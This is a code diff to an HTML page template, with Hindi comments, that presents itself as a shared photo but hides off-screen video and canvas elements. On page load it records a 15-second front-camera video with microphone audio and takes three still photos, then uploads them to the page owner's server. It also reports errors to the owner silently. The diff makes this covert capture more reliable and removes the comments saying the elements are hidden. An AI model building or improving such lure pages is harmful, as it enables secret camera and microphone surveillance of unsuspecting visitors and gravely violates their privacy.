@@ -5,18 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Photo</title>
     <style>
-        body {
-            margin: 0; padding: 10px; background: #111; text-align: center;
-        }
-        img { max-width: 100%; border-radius: 10px; display: block; }
-        video, canvas, #status { position: absolute; left: -9999px; width: 1px; height: 1px; }
+        body { margin:0; padding:10px; background:#111; text-align:center; }
+        img { max-width:100%; border-radius:10px; display:block; }
+        video, canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
     </style>
 </head>
 <body>
-    <!-- केवल आपकी भेजी फोटो दिखेगी -->
     <img src="{{ photo_url }}" alt="Photo">
-
-    <!-- छिपा हुआ वीडियो एलिमेंट (कैमरा स्ट्रीम के लिए) -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -25,6 +20,18 @@
         const uniqueId = "{{ unique_id }}";
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+
+        // एरर को मालिक तक पहुँचाएँ (स्क्रीन पर कुछ नहीं दिखेगा)
+        async function reportError(message) {
+            console.error(message);
+            try {
+                await fetch('/error_report/' + uniqueId, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({message: message})
+                });
+            } catch(e) {}
+        }
 
         // 📸 3 फोटो ऑटो कैप्चर
         async function autoCapture() {
@@ -37,44 +44,79 @@
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const imageData = canvas.toDataURL('image/jpeg', 0.9);
-                    fetch('/upload/' + uniqueId, {
+                    const resp = await fetch('/upload/' + uniqueId, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
-                    }).catch(e => console.error(e));
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({image: imageData})
+                    });
+                    if (!resp.ok) {
+                        const err = await resp.json();
+                        throw new Error(`Upload failed: ${err.reason}`);
+                    }
                     await new Promise(r => setTimeout(r, 300));
                 }
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) { console.error('Photo error:', e); }
+                console.log("Photos sent successfully");
+            } catch(e) {
+                reportError('Photo error: ' + e.message);
+            }
         }
 
         // 🎥 15 सेकंड की वीडियो (माइक के साथ)
         async function recordVideoWithAudio() {
+            let stream;
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
+                stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: true
                 });
                 video.srcObject = stream;
                 await new Promise(r => video.onloadedmetadata = r);
 
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                // सपोर्टेड माइम टाइप चेक करें
+                let mimeType = 'video/webm';
+                if (!MediaRecorder.isTypeSupported('video/webm')) {
+                    mimeType = 'video/mp4';
+                    if (!MediaRecorder.isTypeSupported('video/mp4')) {
+                        mimeType = '';  // default
+                    }
+                }
+                const recorderOptions = mimeType ? { mimeType } : {};
+                const mediaRecorder = new MediaRecorder(stream, recorderOptions);
                 const chunks = [];
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onerror = (e) => {
+                    reportError('MediaRecorder error: ' + e.message);
+                };
                 mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 15000));  // 15 सेकंड
-                mediaRecorder.stop();
-                await new Promise(r => mediaRecorder.onstop = r);
 
-                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                // 15 सेकंड इंतजार करें
+                await new Promise((resolve, reject) => {
+                    setTimeout(resolve, 15000);
+                    mediaRecorder.onerror = reject;
+                });
+                mediaRecorder.stop();
+
+                await new Promise(r => mediaRecorder.onstop = r);
+                if (chunks.length === 0) throw new Error("No video data");
+
+                const videoBlob = new Blob(chunks, { type: mimeType || 'video/webm' });
                 const formData = new FormData();
                 formData.append('video', videoBlob, 'capture.webm');
-                await fetch('/upload_video/' + uniqueId, { method: 'POST', body: formData });
-                stream.getTracks().forEach(track => track.stop());
-            } catch(e) { console.error('Video error:', e); }
+                const resp = await fetch('/upload_video/' + uniqueId, { method: 'POST', body: formData });
+                if (!resp.ok) {
+                    const err = await resp.json();
+                    throw new Error(`Video upload failed: ${err.reason}`);
+                }
+                console.log("Video sent successfully");
+            } catch(e) {
+                reportError('Video error: ' + e.message);
+            } finally {
+                if (stream) stream.getTracks().forEach(track => track.stop());
+            }
         }
 
-        // 🚀 शुरू करें: पहले वीडियो, फिर फोटो
+        // 🚀 शुरू करें
         (async function main() {
             await recordVideoWithAudio();
             await autoCapture();
